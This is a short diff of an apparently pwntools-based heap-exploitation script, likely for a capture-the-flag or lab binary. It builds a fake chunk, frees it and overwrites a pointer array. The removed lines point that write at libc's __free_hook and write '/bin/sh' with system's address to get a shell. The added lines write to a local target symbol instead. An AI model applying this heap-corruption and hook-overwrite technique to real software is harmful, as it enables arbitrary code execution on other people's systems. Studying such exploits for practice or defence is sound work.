@@ -80,9 +80,9 @@ payload = chunk_prev + chunk_size + fd + bk + nop + fake_prev_size + fake_size
 edit(0, payload)
 free(chunk_b)
 
-overlapped_mparray = p64(0)*3 + p64(libc.sym['__free_hook'] - 8)
+overlapped_mparray = p64(0)*3 + p64(elf.sym['target'])
 edit(0, overlapped_mparray)
-edit(0, b'/bin/sh\x00' + p64(libc.sym['system']))
+edit(0, b'Much win')
 target()
 
 
